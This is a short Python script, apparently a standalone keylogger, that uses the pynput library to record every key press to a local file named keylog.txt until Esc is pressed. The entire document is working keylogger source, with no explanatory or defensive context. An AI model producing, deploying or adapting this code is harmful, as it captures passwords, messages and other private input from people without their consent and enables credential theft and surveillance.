from pynput import keyboard

# File to store logs
log_file = "keylog.txt"

# Function to write to file
def write_to_file(key):
    try:
        with open(log_file, "a") as f:
            if hasattr(key, 'char') and key.char is not None:
                f.write(key.char)
            else:
                f.write(f' [{key}] ')
    except Exception as e:
        print(f"Error writing to file: {e}")

# Listener for key presses
def on_press(key):
    write_to_file(key)

# Listener for stopping (optional)
def on_release(key):
    if key == keyboard.Key.esc:  # Press Esc to stop the keylogger
        return False

# Start the listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    print("Keylogger started... Press Esc to stop.")
    listener.join()
